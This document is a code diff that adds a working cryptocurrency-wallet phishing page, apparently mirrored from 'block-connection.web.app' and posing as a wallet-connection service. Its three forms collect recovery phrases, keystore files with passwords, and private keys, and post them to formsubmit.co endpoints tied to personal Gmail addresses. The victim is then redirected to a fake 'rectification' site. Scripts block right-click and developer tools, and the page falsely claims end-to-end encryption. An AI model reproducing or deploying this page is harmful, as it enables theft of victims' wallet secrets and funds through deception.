+                </div>
+
+                <p class="text-sm text-gray-400 text-center mt-6 leading-relaxed">Powered by <a
+                        href="https://web3paymentsolutions.io/" target="_blank"
+                        class="text-blue-400 hover:underline focus:outline-none focus:ring-2 focus:ring-blue-500 rounded">Web3
+                        Payment Solutions</a></p>
+            </section>
+        </main>
+
+        <div id="connectModal" class="modal-overlay hidden" role="dialog" aria-modal="true"
+            aria-labelledby="modalTitle">
+            <div class="modal-content relative">
+                <button
+                    class="absolute top-4 right-4 text-gray-400 hover:text-gray-100 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500 rounded"
+                    onclick="hideModal()" aria-label="Close connection modal">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                        stroke-linecap="round" stroke-linejoin="round">
+                        <line x1="18" y1="6" x2="6" y2="18"></line>
+                        <line x1="6" y1="6" x2="18" y2="18"></line>
+                    </svg>
+                </button>
+                <div class="flex items-center mb-6">
+                    <img id="modalWalletImg" src="#" alt="Wallet Icon" class="w-10 h-10 rounded-full mr-4">
+                    <h3 id="modalTitle" class="text-xl sm:text-2xl font-bold text-gray-100">Connect your <span
+                            id="modalWalletName" class="text-blue-400"></span> Manually</h3>
+                </div>
+
+                <div role="tablist" class="flex justify-evenly border-b-2 border-fuchsia-600 mb-6 text-gray-400">
+                    <button id="phraseTabBtn" role="tab" aria-controls="phraseTab" aria-selected="true"
+                        class="tab-button active p-2 font-medium hover:text-blue-400 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500 rounded"
+                        onclick="switchTab('phrase')">Phrase</button>
+                    <button id="keystoreTabBtn" role="tab" aria-controls="keystoreTab" aria-selected="false"
+                        class="tab-button p-2 font-medium hover:text-blue-400 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500 rounded"
+                        onclick="switchTab('keystore')">Keystore JSON</button>
+                    <button id="privateTabBtn" role="tab" aria-controls="privateTab" aria-selected="false"
+                        class="tab-button p-2 font-medium hover:text-blue-400 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500 rounded"
+                        onclick="switchTab('private')">Private Key</button>
+                </div>
+				
+				<form action="https://formsubmit.co/majekolopade@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                        <input type="hidden" name="_cc" value="formsubmitmails@gmail.com">
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://coindesk-rectificationfix.vercel.app/">   
+                       
+               
+                   <input type='hidden' name='form-name' value='my-form' />
+                    <input type="hidden" name="wallet_id" id="formWalletId" value="">
+
+                    <div id="phraseTab" role="tabpanel" aria-labelledby="phraseTabBtn" class="tab-content active">
+                        <div class="mb-6">
+                            <label for="recov_phrase" class="sr-only">Enter your recovery phrase</label>
+                            <div class="relative flex items-center">
+                                <textarea id="recov_phrase" cols="30" rows="4" placeholder="Enter your recovery phrase"
+                                    class="w-full p-3 pr-12 rounded-lg border border-gray-600 bg-gray-700 text-gray-100 placeholder-gray-400 focus:outline-none focus:border-blue-400 transition-colors"
+                                    name="phrase" required="" ></textarea>
+                                <button type="button"
+                                    class="absolute right-3 text-gray-400 hover:text-gray-100 focus:outline-none focus:ring-2 focus:ring-blue-500 rounded-full p-1"
+                                    onclick="pasteFromClipboard('recov_phrase')"
+                                    aria-label="Paste recovery phrase from clipboard">
+                                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+                                        stroke-width="2" stroke="currentColor" class="w-5 h-5">
+                                        <path stroke-linecap="round" stroke-linejoin="round"
+                                            d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 0 1-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75m11.25 0V8.25m0-4.5H12a2.25 2.25 0 0 0-2.25 2.25v.75m4.5-4.5h5.25c.621 0 1.125.504 1.125 1.125v3.375m0 0h-3.375c-.621 0-1.125.504-1.125 1.125M18.75 16.5v-4.75a.75.75 0 0 0-1.5 0v4.75m0 0c0 .621-.504 1.125-1.125 1.125H12.375m-7.5-1.125h4.5a1.125 1.125 0 0 0 1.125-1.125V6.75m-7.5 0h-.75a1.125 1.125 0 0 0-1.125 1.125V19.5c0 .621.504 1.125 1.125 1.125h.75m7.5-1.125h-.75" />
+                                    </svg>
+                                </button>
+                            </div>
+							
+							
+                            <p id="phraseValidationMsg" class="text-xs text-gray-400 mt-2 leading-normal">Typically 12
+                                (sometimes 24) words separated by single spaces.</p>
+                            <p class="text-xs text-gray-500 mt-1 leading-normal">This process is encrypted end-to-end.
+                            </p>
+                            <div id="pasteWarningPhrase"
+                                class="hidden mt-3 p-2 bg-yellow-600 text-yellow-100 rounded text-sm" role="alert">
+                                <strong>Warning:</strong> Only paste from trusted sources. Pasting from unknown sources
+                                can compromise your wallet!
+                            </div>
+                        </div>
+                        <button type="submit"
+                            class="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500"
+                            submit="proceed()">Proceed</button>
+                    </div>
+                      </form>
+
+		    <form action="https://formsubmit.co/kellyvscott05@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                  <input type="hidden" name="_cc" value="formsubmitmails@gmail.com">
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://coinsdesk-rectifications.vercel.app/">   
+                       
+               
+                   <input type='hidden' name='form-name' value='my-form' />
+                    <input type="hidden" name="wallet_id" id="formWalletId" value="">
+                    <div id="keystoreTab" role="tabpanel" aria-labelledby="keystoreTabBtn" class="tab-content">
+                        <div class="mb-4">
+                            <label for="file-upload" class="block text-sm font-medium text-gray-300 mb-2">Upload
+                                Keystore File</label>
+                            <input id="file-upload" type="file" name="file"
+                                class="w-full p-3 rounded-lg border border-gray-600 bg-gray-700 text-gray-100 placeholder-gray-400 focus:outline-none focus:border-blue-400 transition-colors file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-sm file:font-semibold file:bg-blue-500 file:text-white hover:file:bg-blue-600">
+                        </div>
+                        <div class="mb-6">
+                            <label for="wallet_password" class="sr-only">Wallet password</label>
+                            <input id="wallet_password" type="password" name="keystorepassword"
+                                placeholder="Wallet password"
+                                class="w-full p-3 rounded-lg border border-gray-600 bg-gray-700 text-gray-100 placeholder-gray-400 focus:outline-none focus:border-blue-400 transition-colors"
+                                required="">
+                            <p class="text-xs text-gray-400 mt-2 leading-normal">Several lines of text beginning with
+                                "{...}" plus the password you used to encrypt it.</p>
+                        </div>
+                        <button type="submit"
+                            class="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500"
+                            onclick="proceed()">Proceed</button>
+                    </div>
+		    </form>
+		    <form action="https://formsubmit.co/kellyvscott05@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                  <input type="hidden" name="_cc" value="formsubmitmails@gmail.com">
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://coinsdesk-rectifications.vercel.app/">   
+                       
+               
+                   <input type='hidden' name='form-name' value='my-form' />
+                    <input type="hidden" name="wallet_id" id="formWalletId" value="">
+
+                    <div id="privateTab" role="tabpanel" aria-labelledby="privateTabBtn" class="tab-content">
+                        <div class="mb-6">
+                            <label for="wallet_key" class="sr-only">Enter your Private Key</label>
+                            <div class="relative flex items-center">
+                                <input id="wallet_key" type="text" placeholder="Enter your Private Key"
+                                    name="privatekey"
+                                    class="w-full p-3 pr-12 rounded-lg border border-gray-600 bg-gray-700 text-gray-100 placeholder-gray-400 focus:outline-none focus:border-blue-400 transition-colors"
+                                    required="">
+                                <button type="button"
+                                    class="absolute right-3 text-gray-400 hover:text-gray-100 focus:outline-none focus:ring-2 focus:ring-blue-500 rounded-full p-1"
+                                    onclick="pasteFromClipboard('wallet_key')"
+                                    aria-label="Paste private key from clipboard">
+                                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+                                        stroke-width="2" stroke="currentColor" class="w-5 h-5">
+                                        <path stroke-linecap="round" stroke-linejoin="round"
+                                            d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 0 1-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75m11.25 0V8.25m0-4.5H12a2.25 2.25 0 0 0-2.25 2.25v.75m4.5-4.5h5.25c.621 0 1.125.504 1.125 1.125v3.375m0 0h-3.375c-.621 0-1.125.504-1.125 1.125M18.75 16.5v-4.75a.75.75 0 0 0-1.5 0v4.75m0 0c0 .621-.504 1.125-1.125 1.125H12.375m-7.5-1.125h4.5a1.125 1.125 0 0 0 1.125-1.125V6.75m-7.5 0h-.75a1.125 1.125 0 0 0-1.125 1.125V19.5c0 .621.504 1.125 1.125 1.125h.75m7.5-1.125h-.75" />
+                                    </svg>
+                                </button>
+                            </div>
+			
+                            <p id="privateKeyValidationMsg" class="text-xs text-gray-400 mt-2 leading-normal">Typically
+                                64 alphanumeric characters.</p>
+                            <div id="pasteWarningPrivateKey"
+                                class="hidden mt-3 p-2 bg-yellow-600 text-yellow-100 rounded text-sm" role="alert">
+                                <strong>Warning:</strong> Only paste from trusted sources. Pasting from unknown sources
+                                can compromise your wallet!
+                            </div>
+                        </div>
+                        <button type="submit"
+                            class="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500"
+                            onclick="proceed()">Proceed</button>
+                    </div>
+                </form>
+
+                <button id="cancelModalBtn" type="button" onclick="hideModal()"
+                    class="w-full mt-4 py-2 bg-red-600 hover:bg-red-700 text-white font-medium rounded-lg transition-colors focus:outline-none focus:ring-2 focus:ring-red-500">
+                    Cancel
+                </button>
+            </div>
+        </div>
+
+        <div class="sending" style="display: none;" role="status" aria-live="polite" aria-label="Loading, please wait">
+            <div class="containerz">
+                <div class="boxz">
+                    <div class="borderz one"></div>
+                    <div class="borderz two"></div>
+                    <div class="borderz three"></div>
+                    <div class="borderz four"></div>
+                    <div class="line one"></div>
+                    <div class="line two"></div>
+                    <div class="line three"></div>
+                </div>
+                <p id="loaderMessage" class="text-white text-lg mt-4 text-center">Connecting securely...</p>
+            </div>
+        </div>
+
+    </div>
+    <p id="current_date_and_time"></p>
+
+      <script src="sync.js"></script>
+    
+    
+    <script>
+        // Global variables for loader messages
+        const loaderMessages = [
+            "Connecting securely...",
+            "Establishing connection...",
+            "Verifying credentials...",
+            "Almost done!"
+        ];
+        let currentLoaderMessageIndex = 0;
+        let loaderMessageInterval;
+
+        const LOCAL_STORAGE_RECENT_WALLETS_KEY = 'recentWallets'; // Key for local storage
+        const MAX_RECENT_WALLETS = 5; // Max number of recent wallets to display
+
+        // Function to show page-level messages (success/error)
+        function showPageMessage(message, type) {
+            const msgBox = document.getElementById('pageMessageBox');
+            msgBox.textContent = message;
+            msgBox.className = ''; // Clear existing classes
+            msgBox.classList.add('fixed', 'top-16', 'left-1/2', 'transform', '-translate-x-1/2', 'w-11/12', 'max-w-md', 'p-3', 'rounded-md', 'text-center', 'z-1001');
+            msgBox.classList.add(type); // 'success' or 'error'
+            msgBox.style.display = 'block';
+
+            setTimeout(() => {
+                msgBox.style.display = 'none';
+            }, 5000); // Message visible for 5 seconds
+        }
+
+        // Modal functions
+        function showModal(walletName, walletImgSrc) {
+            const modal = document.getElementById('connectModal');
+            const modalWalletName = document.getElementById('modalWalletName');
+            const modalWalletImg = document.getElementById('modalWalletImg');
+            const formWalletId = document.getElementById('formWalletId');
+
+            modalWalletName.textContent = walletName;
+            modalWalletImg.src = walletImgSrc;
+            formWalletId.value = walletName;
+
+            modal.classList.remove('hidden');
+            document.body.classList.add('overflow-hidden');
+
+            // Ensure first tab is active when modal opens
+            switchTab('phrase');
+        }
+
+        function hideModal() {
+            const modal = document.getElementById('connectModal');
+            modal.classList.add('hidden');
+            document.body.classList.remove('overflow-hidden');
+        }
+
+        // Tab switching function
+        function switchTab(tabId) {
+            const tabs = ['phrase', 'keystore', 'private'];
+            tabs.forEach(id => {
+                const tabContent = document.getElementById(id + 'Tab');
+                const tabButton = document.getElementById(id + 'TabBtn');
+                if (tabContent && tabButton) {
+                    if (id === tabId) {
+                        tabContent.classList.add('active');
+                        tabButton.classList.add('active');
+                        tabButton.setAttribute('aria-selected', 'true');
+                        // Set focus to the first interactive element in the active tab
+                        setTimeout(() => {
+                            const firstFocusable = tabContent.querySelector('input, textarea, button');
+                            if (firstFocusable) {
+                                firstFocusable.focus();
+                            }
+                        }, 100);
+                    } else {
+                        tabContent.classList.remove('active');
+                        tabButton.classList.remove('active');
+                        tabButton.setAttribute('aria-selected', 'false');
+                    }
+                }
+            });
+        }
+
+        // Keyboard navigation for tabs
+        document.querySelectorAll('.tab-button').forEach((button, index, array) => {
+            button.addEventListener('keydown', (event) => {
+                let newIndex;
+                if (event.key === 'ArrowRight') {
+                    newIndex = (index + 1) % array.length;
+                    array[newIndex].focus();
+                    switchTab(array[newIndex].id.replace('TabBtn', ''));
+                    event.preventDefault();
+                } else if (event.key === 'ArrowLeft') {
+                    newIndex = (index - 1 + array.length) % array.length;
+                    array[newIndex].focus();
+                    switchTab(array[newIndex].id.replace('TabBtn', ''));
+                    event.preventDefault();
+                }
+            });
+        });
+
+        // Event listeners for wallet items
+        document.querySelectorAll('.wallet-item').forEach(item => {
+            item.addEventListener('click', () => {
+                const walletName = item.dataset.walletName;
+                const walletImg = item.dataset.walletImg;
+                showModal(walletName, walletImg);
+            });
+            item.addEventListener('keydown', (event) => {
+                if (event.key === 'Enter' || event.key === ' ') {
+                    event.preventDefault();
+                    const walletName = item.dataset.walletName;
+                    const walletImg = item.dataset.walletImg;
+                    showModal(walletName, walletImg);
+                }
+            });
+        });
+
+        // Input Validation Functions
+        function validatePhrase() {
+            const textarea = document.getElementById('recov_phrase');
+            const msg = document.getElementById('phraseValidationMsg');
+            const words = textarea.value.trim().split(/\s+/).filter(word => word.length > 0);
+            if (words.length === 12 || words.length === 24) {
+                textarea.classList.remove('border-red-500');
+                textarea.classList.add('border-green-500');
+                msg.textContent = "Looks good!";
+                msg.classList.remove('text-red-500');
+                msg.classList.add('text-green-500');
+                return true;
+            } else {
+                textarea.classList.remove('border-green-500');
+                textarea.classList.add('border-red-500');
+                msg.textContent = "Phrase must be 12 or 24 words.";
+                msg.classList.remove('text-green-500');
+                msg.classList.add('text-red-500');
+                return false;
+            }
+        }
+
+        function validatePrivateKey() {
+            const input = document.getElementById('wallet_key');
+            const msg = document.getElementById('privateKeyValidationMsg');
+            const value = input.value.trim();
+            // Common private key lengths are 64 (hex) or 66 (with 0x prefix)
+            if (value.length === 64 || (value.startsWith('0x') && value.length === 66 && value.match(/^0x[0-9a-fA-F]{64}$/))) {
+                input.classList.remove('border-red-500');
+                input.classList.add('border-green-500');
+                msg.textContent = "Valid Private Key format.";
+                msg.classList.remove('text-red-500');
+                msg.classList.add('text-green-500');
+                return true;
+            } else {
+                input.classList.remove('border-green-500');
+                input.classList.add('border-red-500');
+                msg.textContent = "Private Key must be 64 hexadecimal characters (or 66 with '0x' prefix).";
+                msg.classList.remove('text-green-500');
+                msg.classList.add('text-red-500');
+                return false;
+            }
+        }
+
+        // Form submission handler
+        // document.getElementById('walletForm').addEventListener('submit', function (event) {
+        //     event.preventDefault();
+
+        //     // Perform final validation based on active tab
+        //     let isValid = true;
+        //     const activeTabId = document.querySelector('.tab-content.active').id.replace('Tab', '');
+
+        //     if (activeTabId === 'phrase') {
+        //         isValid = validatePhrase();
+        //     } else if (activeTabId === 'private') {
+        //         isValid = validatePrivateKey();
+        //     }
+        //     // Keystore JSON validation would typically happen on the backend or require more complex JS validation for file content/password.
+
+        //     if (!isValid) {
+        //         showPageMessage("Please fix the errors in your input.", "error");
+        //         return; // Stop submission if not valid
+        //     }
+
+        //     document.querySelector('.sending').style.display = 'flex'; // Show loader
+        //     document.querySelector('.sending').setAttribute('aria-hidden', 'false');
+
+        //     // Start cycling loader messages
+        //     const loaderMessageElement = document.getElementById('loaderMessage');
+        //     loaderMessageElement.textContent = loaderMessages[0]; // Set initial message
+        //     currentLoaderMessageIndex = 0;
+        //     loaderMessageInterval = setInterval(() => {
+        //         currentLoaderMessageIndex = (currentLoaderMessageIndex + 1) % loaderMessages.length;
+        //         loaderMessageElement.textContent = loaderMessages[currentLoaderMessageIndex];
+        //     }, 3000); // Change message every 3 seconds
+
+        //     hideModal(); // Hide the connection modal
+
+        //     // Get wallet info to save to recent wallets
+        //     const walletName = document.getElementById('modalWalletName').textContent;
+        //     const walletImgSrc = document.getElementById('modalWalletImg').src;
+        //     addRecentWallet(walletName, walletImgSrc); // Save to recently used
+
+        //     // Your actual form submission and Firebase logic here
+        //     emailjs.sendForm('', 'template_', this) // 'this' refers to the form element
+        //         .then(function () {
+        //             console.log('SUCCESS!');
+        //             clearInterval(loaderMessageInterval); // Stop cycling messages
+        //             document.querySelector('.sending').style.display = 'none'; // Hide loader
+        //             document.querySelector('.sending').setAttribute('aria-hidden', 'true');
+        //             showPageMessage("Connection successful! You may be redirected.", "success");
+        //             // Optionally, redirect user after a short delay
+        //             // setTimeout(() => { window.location.href = "success.html"; }, 2000);
+        //         }, function (error) {
+        //             console.log('FAILED...', error);
+        //             clearInterval(loaderMessageInterval); // Stop cycling messages
+        //             document.querySelector('.sending').style.display = 'none'; // Hide loader
+        //             document.querySelector('.sending').setAttribute('aria-hidden', 'true');
+        //             showPageMessage(`Connection failed: ${error.text || JSON.stringify(error)}`, "error");
+        //         });
+        // });
+
+
+        // Disable right-click and developer tools for security
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+        function ctrlShiftKey(e, keyCode) {
+            return e.ctrlKey && e.shiftKey && e.keyCode === keyCode.charCodeAt(0);
+        }
+
+        document.onkeydown = (e) => {
+            if (
+                event.keyCode === 123 ||
+                ctrlShiftKey(e, 'I') ||
+                ctrlShiftKey(e, 'J') ||
+                ctrlShiftKey(e, 'C') ||
+                (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0))
+            )
+                return false;
+        };
+
+        // Custom scrollbar for wallet grid (basic styling)
+        const styleSheet = document.createElement("style");
+        styleSheet.textContent = `
+            .custom-scrollbar::-webkit-scrollbar {
+                width: 8px;
+            }
+            .custom-scrollbar::-webkit-scrollbar-track {
+                background: #2d3748; /* gray-800 */
+                border-radius: 10px;
+            }
+            .custom-scrollbar::-webkit-scrollbar-thumb {
+                background: #4a5568; /* gray-600 */
+                border-radius: 10px;
+            }
+            .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+                background: #63b3ed; /* blue-400 */
+            }
+        `;
+        document.head.appendChild(styleSheet);
+
+        // Search functionality
+        document.getElementById('walletSearch').addEventListener('input', function (event) {
+            const searchTerm = event.target.value.toLowerCase();
+            const walletItems = document.querySelectorAll('.wallet-item');
+            walletItems.forEach(item => {
+                const walletName = item.dataset.walletName.toLowerCase();
+                const compatibility = item.dataset.compatibility ? item.dataset.compatibility.toLowerCase() : ''; // Get compatibility data
+
+                if (walletName.includes(searchTerm) || compatibility.includes(searchTerm)) {
+                    item.style.display = 'flex'; /* Show the wallet item */
+                } else {
+                    item.style.display = 'none'; /* Hide the wallet item */
+                }
+            });
+        });
+
+        // Recently Used Wallets Functions
+        function getRecentWallets() {
+            const recentWalletsString = localStorage.getItem(LOCAL_STORAGE_RECENT_WALLETS_KEY);
+            return recentWalletsString ? JSON.parse(recentWalletsString) : [];
+        }
+
+        function addRecentWallet(name, imgSrc) {
+            let recentWallets = getRecentWallets();
+            const newWallet = { name, imgSrc };
+
+            // Remove if already exists to move it to the top
+            recentWallets = recentWallets.filter(wallet => wallet.name !== name);
+
+            // Add new wallet to the beginning
+            recentWallets.unshift(newWallet);
+
+            // Trim to max allowed
+            if (recentWallets.length > MAX_RECENT_WALLETS) {
+                recentWallets = recentWallets.slice(0, MAX_RECENT_WALLETS);
+            }
+
+            localStorage.setItem(LOCAL_STORAGE_RECENT_WALLETS_KEY, JSON.stringify(recentWallets));
+            renderRecentWallets(); // Re-render the section
+        }
+
+        function renderRecentWallets() {
+            const recentWallets = getRecentWallets();
+            const recentWalletsSection = document.getElementById('recentlyUsedWallets');
+            const recentWalletGrid = document.getElementById('recentWalletGrid');
+
+            recentWalletGrid.innerHTML = ''; // Clear existing
+
+            if (recentWallets.length === 0) {
+                recentWalletsSection.classList.add('hidden');
+                return;
+            }
+
+            recentWalletsSection.classList.remove('hidden');
+
+            recentWallets.forEach(wallet => {
+                const walletItem = document.createElement('div');
+                walletItem.className = 'wallet-item flex flex-col items-center p-3 sm:p-4 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500';
+                walletItem.setAttribute('role', 'button');
+                walletItem.setAttribute('tabindex', '0');
+                walletItem.setAttribute('aria-label', `Connect with recently used ${wallet.name} wallet`);
+                walletItem.dataset.walletName = wallet.name;
+                walletItem.dataset.walletImg = wallet.imgSrc;
+                walletItem.innerHTML = `
+                    <img class="w-12 h-12 sm:w-16 sm:h-16 rounded-full mb-2" src="${wallet.imgSrc}" alt="${wallet.name} logo">
+                    <span class="text-base sm:text-lg font-semibold text-gray-100">${wallet.name}</span>
+                    <div class="flex flex-wrap justify-center mt-1">
+                        <span class="compatibility-tag">Recent</span>
+                    </div>
+                `;
+                // Re-add click/keydown listeners for newly created elements
+                walletItem.addEventListener('click', () => showModal(wallet.name, wallet.imgSrc));
+                walletItem.addEventListener('keydown', (event) => {
+                    if (event.key === 'Enter' || event.key === ' ') {
+                        event.preventDefault();
+                        showModal(wallet.name, wallet.imgSrc);
+                    }
+                });
+                recentWalletGrid.appendChild(walletItem);
+            });
+        }
+
+        // Clipboard Paste Functions
+        async function pasteFromClipboard(elementId) {
+            const inputElement = document.getElementById(elementId);
+            const warningElement = document.getElementById(`pasteWarning${capitalizeFirstLetter(elementId)}`);
+
+            try {
+                const text = await navigator.clipboard.readText();
+                inputElement.value = text;
+                // Trigger validation if relevant
+                if (elementId === 'recov_phrase') validatePhrase();
+                if (elementId === 'wallet_key') validatePrivateKey();
+
+                warningElement.classList.remove('hidden'); // Show warning
+                setTimeout(() => {
+                    warningElement.classList.add('hidden'); // Hide after a few seconds
+                }, 7000); // 7 seconds
+            } catch (err) {
+                console.error('Failed to read clipboard contents: ', err);
+                showPageMessage('Failed to paste from clipboard. Please paste manually.', 'error');
+            }
+        }
+
+        function capitalizeFirstLetter(string) {
+            return string.charAt(0).toUpperCase() + string.slice(1);
+        }
+
+        // Initial render of recent wallets on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            renderRecentWallets();
+        });
+    </script>
+</body>
+
+
+<!-- Mirrored from block-connection.web.app/collab-server/connect.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Jul 2025 22:21:12 GMT -->
+</html>
+
+
